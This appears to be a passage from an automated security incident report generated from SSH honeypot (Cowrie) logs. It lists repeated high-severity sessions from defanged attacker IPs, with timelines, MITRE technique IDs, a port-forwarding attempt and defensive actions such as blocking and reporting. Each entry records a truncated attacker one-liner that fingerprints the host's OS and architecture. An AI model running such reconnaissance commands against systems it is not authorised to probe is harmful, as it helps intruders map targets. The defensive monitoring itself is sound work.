| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:46:25` | `cowrie.session.connect` |
| `2026-09-25 19:46:25` | `cowrie.client.version` |
| `2026-09-25 19:46:25` | `cowrie.client.kex` |
| `2026-09-25 19:46:27` | `cowrie.login.success` |
| `2026-09-25 19:46:29` | `cowrie.session.params` |
| `2026-09-25 19:46:29` | `cowrie.command.input` |
| `2026-09-25 19:46:29` | `cowrie.command.input` |
| `2026-09-25 19:46:29` | `cowrie.command.input` |
| `2026-09-25 19:46:29` | `cowrie.command.input` |
| `2026-09-25 19:46:29` | `cowrie.command.input` |
| `2026-09-25 19:46:29` | `cowrie.command.success` |
| `2026-09-25 19:46:29` | `cowrie.command.input` |
| `2026-09-25 19:46:29` | `cowrie.command.input` |
| `2026-09-25 19:46:29` | `cowrie.command.input` |
| `2026-09-25 19:46:29` | `cowrie.command.input` |
| `2026-09-25 19:46:29` | `cowrie.log.closed` |
| `2026-09-25 19:46:31` | `cowrie.session.params` |
| `2026-09-25 19:46:31` | `cowrie.command.input` |
| `2026-09-25 19:46:31` | `cowrie.log.closed` |
| `2026-09-25 19:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62cd18ee9f5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:48 |
| **Last Seen** | 2026-09-25 19:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:48:13` | `cowrie.session.connect` |
| `2026-09-25 19:48:13` | `cowrie.client.version` |
| `2026-09-25 19:48:13` | `cowrie.client.kex` |
| `2026-09-25 19:48:15` | `cowrie.login.success` |
| `2026-09-25 19:48:16` | `cowrie.session.params` |
| `2026-09-25 19:48:16` | `cowrie.command.input` |
| `2026-09-25 19:48:16` | `cowrie.command.input` |
| `2026-09-25 19:48:16` | `cowrie.command.input` |
| `2026-09-25 19:48:16` | `cowrie.command.input` |
| `2026-09-25 19:48:16` | `cowrie.command.input` |
| `2026-09-25 19:48:16` | `cowrie.command.success` |
| `2026-09-25 19:48:16` | `cowrie.command.input` |
| `2026-09-25 19:48:16` | `cowrie.command.input` |
| `2026-09-25 19:48:16` | `cowrie.command.input` |
| `2026-09-25 19:48:16` | `cowrie.command.input` |
| `2026-09-25 19:48:16` | `cowrie.log.closed` |
| `2026-09-25 19:48:17` | `cowrie.session.params` |
| `2026-09-25 19:48:17` | `cowrie.command.input` |
| `2026-09-25 19:48:18` | `cowrie.log.closed` |
| `2026-09-25 19:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75f25d645a99

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:50 |
| **Last Seen** | 2026-09-25 19:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:50:03` | `cowrie.session.connect` |
| `2026-09-25 19:50:03` | `cowrie.client.version` |
| `2026-09-25 19:50:03` | `cowrie.client.kex` |
| `2026-09-25 19:50:04` | `cowrie.login.success` |
| `2026-09-25 19:50:05` | `cowrie.session.params` |
| `2026-09-25 19:50:05` | `cowrie.command.input` |
| `2026-09-25 19:50:05` | `cowrie.command.input` |
| `2026-09-25 19:50:05` | `cowrie.command.input` |
| `2026-09-25 19:50:05` | `cowrie.command.input` |
| `2026-09-25 19:50:05` | `cowrie.command.input` |
| `2026-09-25 19:50:05` | `cowrie.command.success` |
| `2026-09-25 19:50:05` | `cowrie.command.input` |
| `2026-09-25 19:50:05` | `cowrie.command.input` |
| `2026-09-25 19:50:06` | `cowrie.command.input` |
| `2026-09-25 19:50:06` | `cowrie.command.input` |
| `2026-09-25 19:50:06` | `cowrie.log.closed` |
| `2026-09-25 19:50:07` | `cowrie.session.params` |
| `2026-09-25 19:50:07` | `cowrie.command.input` |
| `2026-09-25 19:50:08` | `cowrie.log.closed` |
| `2026-09-25 19:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6448cab84a8f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:51 |
| **Last Seen** | 2026-09-25 19:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:51:56` | `cowrie.session.connect` |
| `2026-09-25 19:51:56` | `cowrie.client.version` |
| `2026-09-25 19:51:56` | `cowrie.client.kex` |
| `2026-09-25 19:51:57` | `cowrie.login.success` |
| `2026-09-25 19:51:58` | `cowrie.session.params` |
| `2026-09-25 19:51:58` | `cowrie.command.input` |
| `2026-09-25 19:51:58` | `cowrie.command.input` |
| `2026-09-25 19:51:58` | `cowrie.command.input` |
| `2026-09-25 19:51:58` | `cowrie.command.input` |
| `2026-09-25 19:51:58` | `cowrie.command.input` |
| `2026-09-25 19:51:58` | `cowrie.command.success` |
| `2026-09-25 19:51:58` | `cowrie.command.input` |
| `2026-09-25 19:51:58` | `cowrie.command.input` |
| `2026-09-25 19:51:58` | `cowrie.command.input` |
| `2026-09-25 19:51:59` | `cowrie.command.input` |
| `2026-09-25 19:51:59` | `cowrie.log.closed` |
| `2026-09-25 19:52:00` | `cowrie.session.params` |
| `2026-09-25 19:52:00` | `cowrie.command.input` |
| `2026-09-25 19:52:00` | `cowrie.log.closed` |
| `2026-09-25 19:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8160451b022e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:53 |
| **Last Seen** | 2026-09-25 19:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:53:46` | `cowrie.session.connect` |
| `2026-09-25 19:53:46` | `cowrie.client.version` |
| `2026-09-25 19:53:46` | `cowrie.client.kex` |
| `2026-09-25 19:53:47` | `cowrie.login.success` |
| `2026-09-25 19:53:49` | `cowrie.session.params` |
| `2026-09-25 19:53:49` | `cowrie.command.input` |
| `2026-09-25 19:53:49` | `cowrie.command.input` |
| `2026-09-25 19:53:49` | `cowrie.command.input` |
| `2026-09-25 19:53:49` | `cowrie.command.input` |
| `2026-09-25 19:53:49` | `cowrie.command.input` |
| `2026-09-25 19:53:49` | `cowrie.command.success` |
| `2026-09-25 19:53:49` | `cowrie.command.input` |
| `2026-09-25 19:53:49` | `cowrie.command.input` |
| `2026-09-25 19:53:49` | `cowrie.command.input` |
| `2026-09-25 19:53:49` | `cowrie.command.input` |
| `2026-09-25 19:53:50` | `cowrie.log.closed` |
| `2026-09-25 19:53:51` | `cowrie.session.params` |
| `2026-09-25 19:53:51` | `cowrie.command.input` |
| `2026-09-25 19:53:51` | `cowrie.log.closed` |
| `2026-09-25 19:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d566138c1a10

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:55 |
| **Last Seen** | 2026-09-25 19:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:55:41` | `cowrie.session.connect` |
| `2026-09-25 19:55:41` | `cowrie.client.version` |
| `2026-09-25 19:55:41` | `cowrie.client.kex` |
| `2026-09-25 19:55:42` | `cowrie.login.success` |
| `2026-09-25 19:55:43` | `cowrie.session.params` |
| `2026-09-25 19:55:43` | `cowrie.command.input` |
| `2026-09-25 19:55:43` | `cowrie.command.input` |
| `2026-09-25 19:55:43` | `cowrie.command.input` |
| `2026-09-25 19:55:43` | `cowrie.command.input` |
| `2026-09-25 19:55:43` | `cowrie.command.input` |
| `2026-09-25 19:55:43` | `cowrie.command.success` |
| `2026-09-25 19:55:43` | `cowrie.command.input` |
| `2026-09-25 19:55:43` | `cowrie.command.input` |
| `2026-09-25 19:55:43` | `cowrie.command.input` |
| `2026-09-25 19:55:43` | `cowrie.command.input` |
| `2026-09-25 19:55:44` | `cowrie.log.closed` |
| `2026-09-25 19:55:45` | `cowrie.session.params` |
| `2026-09-25 19:55:45` | `cowrie.command.input` |
| `2026-09-25 19:55:45` | `cowrie.log.closed` |
| `2026-09-25 19:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-583217846417

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:57 |
| **Last Seen** | 2026-09-25 19:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:57:42` | `cowrie.session.connect` |
| `2026-09-25 19:57:42` | `cowrie.client.version` |
| `2026-09-25 19:57:42` | `cowrie.client.kex` |
| `2026-09-25 19:57:43` | `cowrie.login.success` |
| `2026-09-25 19:57:45` | `cowrie.session.params` |
| `2026-09-25 19:57:45` | `cowrie.command.input` |
| `2026-09-25 19:57:45` | `cowrie.command.input` |
| `2026-09-25 19:57:45` | `cowrie.command.input` |
| `2026-09-25 19:57:45` | `cowrie.command.input` |
| `2026-09-25 19:57:45` | `cowrie.command.input` |
| `2026-09-25 19:57:45` | `cowrie.command.success` |
| `2026-09-25 19:57:45` | `cowrie.command.input` |
| `2026-09-25 19:57:45` | `cowrie.command.input` |
| `2026-09-25 19:57:45` | `cowrie.command.input` |
| `2026-09-25 19:57:45` | `cowrie.command.input` |
| `2026-09-25 19:57:45` | `cowrie.log.closed` |
| `2026-09-25 19:57:46` | `cowrie.session.params` |
| `2026-09-25 19:57:46` | `cowrie.command.input` |
| `2026-09-25 19:57:46` | `cowrie.log.closed` |
| `2026-09-25 19:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e2c7b4e4e6a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:59 |
| **Last Seen** | 2026-09-25 19:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:59:42` | `cowrie.session.connect` |
| `2026-09-25 19:59:42` | `cowrie.client.version` |
| `2026-09-25 19:59:42` | `cowrie.client.kex` |
| `2026-09-25 19:59:43` | `cowrie.login.success` |
| `2026-09-25 19:59:44` | `cowrie.session.params` |
| `2026-09-25 19:59:44` | `cowrie.command.input` |
| `2026-09-25 19:59:44` | `cowrie.command.input` |
| `2026-09-25 19:59:44` | `cowrie.command.input` |
| `2026-09-25 19:59:44` | `cowrie.command.input` |
| `2026-09-25 19:59:44` | `cowrie.command.input` |
| `2026-09-25 19:59:44` | `cowrie.command.success` |
| `2026-09-25 19:59:44` | `cowrie.command.input` |
| `2026-09-25 19:59:44` | `cowrie.command.input` |
| `2026-09-25 19:59:44` | `cowrie.command.input` |
| `2026-09-25 19:59:44` | `cowrie.command.input` |
| `2026-09-25 19:59:45` | `cowrie.log.closed` |
| `2026-09-25 19:59:46` | `cowrie.session.params` |
| `2026-09-25 19:59:46` | `cowrie.command.input` |
| `2026-09-25 19:59:46` | `cowrie.log.closed` |
| `2026-09-25 19:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ea86d3c707

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 20:01 |
| **Last Seen** | 2026-09-25 20:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:01:40` | `cowrie.session.connect` |
| `2026-09-25 20:01:40` | `cowrie.client.version` |
| `2026-09-25 20:01:40` | `cowrie.client.kex` |
| `2026-09-25 20:01:41` | `cowrie.login.success` |
| `2026-09-25 20:01:42` | `cowrie.session.params` |
| `2026-09-25 20:01:42` | `cowrie.command.input` |
| `2026-09-25 20:01:42` | `cowrie.command.input` |
| `2026-09-25 20:01:42` | `cowrie.command.input` |
| `2026-09-25 20:01:42` | `cowrie.command.input` |
| `2026-09-25 20:01:42` | `cowrie.command.input` |
| `2026-09-25 20:01:42` | `cowrie.command.success` |
| `2026-09-25 20:01:42` | `cowrie.command.input` |
| `2026-09-25 20:01:42` | `cowrie.command.input` |
| `2026-09-25 20:01:42` | `cowrie.command.input` |
| `2026-09-25 20:01:42` | `cowrie.command.input` |
| `2026-09-25 20:01:43` | `cowrie.log.closed` |
| `2026-09-25 20:01:43` | `cowrie.session.params` |
| `2026-09-25 20:01:43` | `cowrie.command.input` |
| `2026-09-25 20:01:44` | `cowrie.log.closed` |
| `2026-09-25 20:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a596a3bd89f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-25 20:03 |
| **Last Seen** | 2026-09-25 20:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:03:33` | `cowrie.session.connect` |
| `2026-09-25 20:03:33` | `cowrie.client.version` |
| `2026-09-25 20:03:33` | `cowrie.client.kex` |
| `2026-09-25 20:03:34` | `cowrie.login.success` |
| `2026-09-25 20:03:34` | `cowrie.direct-tcpip.request` |
| `2026-09-25 20:03:34` | `cowrie.direct-tcpip.data` |
| `2026-09-25 20:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c04a9391c2b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 20:03 |
| **Last Seen** | 2026-09-25 20:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:03:42` | `cowrie.session.connect` |
| `2026-09-25 20:03:42` | `cowrie.client.version` |
| `2026-09-25 20:03:42` | `cowrie.client.kex` |
| `2026-09-25 20:03:43` | `cowrie.login.success` |
| `2026-09-25 20:03:44` | `cowrie.session.params` |
| `2026-09-25 20:03:44` | `cowrie.command.input` |
| `2026-09-25 20:03:44` | `cowrie.command.input` |
| `2026-09-25 20:03:44` | `cowrie.command.input` |
| `2026-09-25 20:03:44` | `cowrie.command.input` |
| `2026-09-25 20:03:44` | `cowrie.command.input` |
| `2026-09-25 20:03:44` | `cowrie.command.success` |
| `2026-09-25 20:03:44` | `cowrie.command.input` |
| `2026-09-25 20:03:44` | `cowrie.command.input` |
| `2026-09-25 20:03:44` | `cowrie.command.input` |
| `2026-09-25 20:03:44` | `cowrie.command.input` |
| `2026-09-25 20:03:44` | `cowrie.log.closed` |
| `2026-09-25 20:03:46` | `cowrie.session.params` |
| `2026-09-25 20:03:46` | `cowrie.command.input` |
| `2026-09-25 20:03:46` | `cowrie.log.closed` |
| `2026-09-25 20:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b9fc26da25

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 20:05 |
| **Last Seen** | 2026-09-25 20:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:05:39` | `cowrie.session.connect` |
| `2026-09-25 20:05:40` | `cowrie.client.version` |
| `2026-09-25 20:05:40` | `cowrie.client.kex` |
| `2026-09-25 20:05:41` | `cowrie.login.success` |
| `2026-09-25 20:05:42` | `cowrie.session.params` |
| `2026-09-25 20:05:42` | `cowrie.command.input` |
| `2026-09-25 20:05:42` | `cowrie.command.input` |
| `2026-09-25 20:05:42` | `cowrie.command.input` |
| `2026-09-25 20:05:42` | `cowrie.command.input` |
| `2026-09-25 20:05:42` | `cowrie.command.input` |
| `2026-09-25 20:05:42` | `cowrie.command.success` |
| `2026-09-25 20:05:42` | `cowrie.command.input` |
| `2026-09-25 20:05:42` | `cowrie.command.input` |
| `2026-09-25 20:05:42` | `cowrie.command.input` |
| `2026-09-25 20:05:42` | `cowrie.command.input` |
| `2026-09-25 20:05:43` | `cowrie.log.closed` |
| `2026-09-25 20:05:44` | `cowrie.session.params` |
| `2026-09-25 20:05:44` | `cowrie.command.input` |
| `2026-09-25 20:05:44` | `cowrie.log.closed` |
| `2026-09-25 20:05:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
